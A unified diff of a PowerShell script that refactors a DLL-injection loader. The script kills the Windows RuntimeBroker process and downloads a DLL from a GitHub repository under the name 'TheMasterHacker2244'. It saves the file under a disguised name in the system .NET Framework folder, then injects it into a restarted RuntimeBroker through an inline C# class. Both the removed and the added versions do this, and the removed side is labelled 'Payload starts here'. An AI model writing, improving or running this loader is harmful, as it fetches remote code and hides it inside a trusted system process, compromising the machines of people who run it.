@@ -1,24 +1,14 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# ── Payload starts here ──
-$p="$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
-$n='RuntimeBroker'
-$x="$env:SystemRoot\System32\$n.exe"
-$r=@(Get-Process -Name $n -ErrorAction SilentlyContinue)
-$inj=$false
+$dllPath = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
+$processName = 'RuntimeBroker'
+$processPath = "$env:SystemRoot\System32\$processName.exe"
 
-if($r.Count -gt 0){
-    try{
-        if($r[0].Modules | Where-Object {$_.FileName -eq $p}){
-            $inj=$true
-            Stop-Process -Name $n -Force
-            Start-Sleep 2
-        }
-    }catch{}
-}
+Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
+Start-Sleep -Seconds 2
 
-New-Item -ItemType Directory -Force -Path (Split-Path $p) | Out-Null
-iwr "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $p -ErrorAction Stop
+New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $dllPath -ErrorAction Stop
 
 Add-Type -TypeDefinition @'
 using System;
@@ -52,24 +42,14 @@ public class I{
 }
 '@ -ReferencedAssemblies System.Runtime.InteropServices
 
-if($inj){
-    Start-Process $x
-    Start-Sleep 2
-    $r=@(Get-Process -Name $n -ErrorAction SilentlyContinue)
-    if($r.Count -gt 0){
-        $result=[I]::X($r[0].Id,$p)
-        if($result){ Write-Host "Injected" }
-        else{ Write-Host "unable to inject" }
-    } else { Write-Host "unable to inject" }
+Start-Process -FilePath $processPath
+Start-Sleep -Seconds 2
+
+$proc = Get-Process -Name $processName -ErrorAction SilentlyContinue
+if ($proc) {
+    $result = [I]::X($proc[0].Id, $dllPath)
+    if ($result) { Write-Host "Injected" }
+    else { Write-Host "unable to inject" }
 } else {
-    if($r.Count -eq 0){
-        Start-Process $x
-        Start-Sleep 2
-        $r=@(Get-Process -Name $n -ErrorAction SilentlyContinue)
-    }
-    if($r.Count -gt 0){
-        $result=[I]::X($r[0].Id,$p)
-        if($result){ Write-Host "Injected" }
-        else{ Write-Host "unable to inject" }
-    } else { Write-Host "unable to inject" }
+    Write-Host "unable to inject"
 }
